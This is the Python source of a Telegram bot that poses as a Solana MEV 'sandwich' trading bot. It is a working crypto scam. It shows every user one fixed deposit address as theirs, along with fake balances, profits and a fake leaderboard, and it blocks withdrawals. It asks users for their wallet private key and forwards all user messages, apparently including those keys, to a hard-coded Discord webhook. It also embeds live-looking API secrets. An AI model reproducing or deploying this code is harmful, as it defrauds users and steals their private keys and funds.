import telebot
from telebot import types
import requests

bot = telebot.TeleBot('7929109889:AAHIg3K3laWwM7afdkKjTBzCYRzl1kOxXEs'
                      )  # Remplacez par votre token
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1297580709510254672/jhGOaHtVcJZ8XAdMJKlAODrO4ZnZsbMy4IhLOIeoipaZS-9mujnj6u_G7CCTKWd76qJq'

user_messages = {}


def delete_old_messages(chat_id):
    if chat_id in user_messages:
        for msg_id in user_messages[chat_id]:
            try:
                bot.delete_message(chat_id, msg_id)
            except:
                pass
        user_messages[chat_id] = []


def track_message(chat_id, message):
    if chat_id not in user_messages:
        user_messages[chat_id] = []
    user_messages[chat_id].append(message.message_id)


def log_message_to_discord(user_id, username, message_text):
    payload = {
        "content":
        f"User @{username} (ID: {user_id}) sent a message: `{message_text}`"
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code != 204:
            print(f"Failed to send message to Discord: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")


def main_menu(message):
    delete_old_messages(message.chat.id)

    markup = types.InlineKeyboardMarkup(row_width=2)
    deploy_mev = types.InlineKeyboardButton('🚀 Deploy MEV Bot',
                                            callback_data='deploy_mev')
    deploy_pumpfun = types.InlineKeyboardButton('💊 Deploy MEV on Pump.fun',
                                                callback_data='deploy_pumpfun')
    view_tx = types.InlineKeyboardButton('📄 View Transactions',
                                         callback_data='view_transactions')
    help_btn = types.InlineKeyboardButton('❓ Help', callback_data='help')
    website = types.InlineKeyboardButton('🌐 Website',
                                         url='https://www.jito.wtf/')
    withdraw = types.InlineKeyboardButton('💸 Withdraw SOL',
                                          callback_data='withdraw')
    leaderboard = types.InlineKeyboardButton('🏆 Leaderboard',
                                             callback_data='leaderboard')
    refresh = types.InlineKeyboardButton('🔄 Refresh', callback_data='refresh')
    import_key = types.InlineKeyboardButton(
        '🔑 Import Private Key',
        callback_data='import_private_key')  # Nouveau bouton
    settings = types.InlineKeyboardButton(
        '⚙️ Settings', callback_data='settings')  # Bouton settings en dernier

    markup.add(deploy_mev, deploy_pumpfun, view_tx, help_btn, withdraw,
               leaderboard, refresh, import_key,
               settings)  # Settings ajouté en dernier

    text = (
        f'👋 Welcome {message.from_user.username}, to Solana MEV Bot!\n\n'
        '🚀 Identify big transactions, buy ahead, and sell strategically with our MEV bot for maximum profit.\n\n'
        '⚡️ Unmatched Speed: Solana’s lightning-fast transactions.\n'
        '🔍 Smart Strategies: Backrun and frontrun for optimal profits.\n'
        '💰 High Earnings: Average profit: ✅ 0.4 to 2.6+ SOL per hour.\n\n'
        '🌐 Supported Pools: Jupiter, Raydium, Orca, Meteora, Fluxbeam, PumpFun, Moonshot.\n\n'
        '🔒 Recommended Starting Amount: For optimal performance and to minimize competition, we recommend starting with a minimum balance equivalent to 0.02 SOL.\n'
        '⚠️ Minimum deposit is 0.01 SOL. (We take 1% on profits)\n\n'
        f'📌 Wallet address generated for @{message.from_user.username}: '
        '`D72nq6iqVCW176saaPfPs8braBy4xFvaZsLDftuph2tj`\n\n'  # Format monospaced pour l'adresse
        '💎 Wallet balance: 0.00 SOL\n')

    msg = bot.send_message(message.chat.id,
                           text,
                           reply_markup=markup,
                           parse_mode='Markdown')
    track_message(message.chat.id, msg)


@bot.callback_query_handler(
    func=lambda call: call.data == 'import_private_key')
def import_private_key(call):
    delete_old_messages(call.message.chat.id)

    markup = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton('🔙 Back', callback_data='back_to_menu')
    markup.add(back)

    msg = bot.send_message(
        call.message.chat.id,
        '🔑 Please send your private key below to import it.\n\n'
        '⚠️ **IMPORTANT**: Do not share your private key with anyone else, and ensure you are using a secure connection.',
        reply_markup=markup,
        parse_mode='Markdown')
    track_message(call.message.chat.id, msg)

    # Après avoir importé la clé privée, retour au menu
    @bot.message_handler(
        func=lambda message: message.chat.id == call.message.chat.id and
        message.text
    )  # Détecter l'envoi d'un message après la demande de clé privée
    def handle_private_key(message):
        bot.send_message(
            message.chat.id,
            '✅ Private key imported successfully! Returning to main menu...')
        main_menu(message)  # Retour au menu principal


@bot.callback_query_handler(func=lambda call: call.data == 'refresh')
def refresh_menu(call):
    delete_old_messages(call.message.chat.id)
    main_menu(call.message)


@bot.callback_query_handler(func=lambda call: call.data == 'deploy_mev')
def deploy_mev(call):
    delete_old_messages(call.message.chat.id)

    markup = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton('🔙 Back', callback_data='back_to_menu')
    markup.add(back)

    msg = bot.send_message(
        call.message.chat.id, 'Balance: 0.0 SOL\n\n'
        '⚠️ Warning: Your wallet balance is 0.0 SOL.\n\n'
        'Your current balance is insufficient. Please ensure your wallet is adequately funded to proceed with deploying the Solana MEV bot.',
        reply_markup=markup)
    track_message(call.message.chat.id, msg)


@bot.callback_query_handler(func=lambda call: call.data == 'deploy_pumpfun')
def deploy_pumpfun(call):
    delete_old_messages(call.message.chat.id)

    markup = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton('🔙 Back', callback_data='back_to_menu')
    markup.add(back)

    msg = bot.send_message(
        call.message.chat.id, 'Balance: 0.0 SOL\n\n'
        '⚠️ Warning: Your wallet balance is 0.0 SOL.\n\n'
        'Your current balance is insufficient. Please ensure your wallet is adequately funded to proceed with deploying the MEV on Pump.fun.',
        reply_markup=markup)
    track_message(call.message.chat.id, msg)


@bot.callback_query_handler(func=lambda call: call.data == 'view_transactions')
def view_transactions(call):
    delete_old_messages(call.message.chat.id)

    markup = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton('🔙 Back', callback_data='back_to_menu')
    markup.add(back)

    msg = bot.send_message(
        call.message.chat.id,
        'You currently have no active positions. Once you start trading, your transactions will be displayed here.',
        reply_markup=markup)
    track_message(call.message.chat.id, msg)


@bot.callback_query_handler(func=lambda call: call.data == 'settings')
def settings(call):
    delete_old_messages(call.message.chat.id)

    markup = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton('🔙 Back', callback_data='back_to_menu')
    markup.add(back)

    msg = bot.send_message(
        call.message.chat.id, 'Balance: 0.0 SOL\n\n'
        '⚠️ Warning: Your wallet balance is 0.0 SOL.\n\n'
        'Your balance is insufficient. Please top up your trading wallet to gain access to the Solana MEV bot settings.',
        reply_markup=markup)
    track_message(call.message.chat.id, msg)


@bot.callback_query_handler(func=lambda call: call.data == 'help')
def help_menu(call):
    delete_old_messages(call.message.chat.id)

    markup = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton('🔙 Back', callback_data='back_to_menu')
    markup.add(back)

    msg = bot.send_message(
        call.message.chat.id, '⭐️ How does the MEV Sandwich bot operate?\n'
        'The bot detects large transactions on the Solana blockchain, strategically placing a buy order before and a sell order after the target transaction to maximize profit.\n\n'
        '⭐️ What tokens are supported for trading?\n'
        'Our bot supports most tokens available on major liquidity pools such as Jupiter, Raydium, Orca, Meteora, Fluxbeam, PumpFun, and Moonshot.\n\n'
        '⭐️ What security measures are in place to protect my assets?\n'
        'Our bot is built with top-tier security protocols, including encryption and multi-factor authentication, to ensure your assets are safeguarded at all times.\n\n'
        '⭐️ Can I set custom trading parameters?\n'
        'Yes, the bot allows customization of trading parameters such as transaction size, slippage tolerance, and specific token pairs to trade.\n\n'
        '⭐️ Are there any fees associated with using the bot?\n'
        'Yes, a 1% trading fee is charged on both buying and selling transactions.',
        reply_markup=markup)
    track_message(call.message.chat.id, msg)


@bot.callback_query_handler(func=lambda call: call.data == 'withdraw')
def withdraw(call):
    delete_old_messages(call.message.chat.id)

    markup = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton('🔙 Back', callback_data='back_to_menu')
    markup.add(back)

    msg = bot.send_message(
        call.message.chat.id, '💸 Withdraw SOL\n\n'
        '❌ The bot has not been deployed to initiate any sandwich attacks in the pools yet; therefore, withdrawals cannot be processed.',
        reply_markup=markup)
    track_message(call.message.chat.id, msg)


@bot.callback_query_handler(func=lambda call: call.data == 'leaderboard')
def leaderboard(call):
    delete_old_messages(call.message.chat.id)

    markup = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton('🔙 Back', callback_data='back_to_menu')
    markup.add(back)

    msg = bot.send_message(call.message.chat.id, '🔝TOP USER PNL:\n\n'
                           '🥇 User #7019 @ 419.09 SOL\n'
                           '🥈 User #2254 @ 399.45 SOL\n'
                           '🥉 User #8919 @ 365.02 SOL\n\n'
                           'Last Update: 21 October 2024\n\n'
                           'Your Monthly Volume: 0.0 SOL\n'
                           'Your Current PnL: 0.0 SOL\n\n'
                           'Stay tuned for updates!',
                           reply_markup=markup)
    track_message(call.message.chat.id, msg)


@bot.callback_query_handler(func=lambda call: call.data == 'back_to_menu')
def back_to_menu(call):
    delete_old_messages(call.message.chat.id)
    main_menu(call.message)


@bot.message_handler(commands=['start'])
def start_command(message):
    # Log the /start command
    log_message_to_discord(message.from_user.id, message.from_user.username,
                           "/start")
    main_menu(message)


@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else "Unknown User"
    message_text = message.text

    # Log the message to Discord
    log_message_to_discord(user_id, username, message_text)


# Démarre le bot
print("Bot is polling...")
bot.polling()
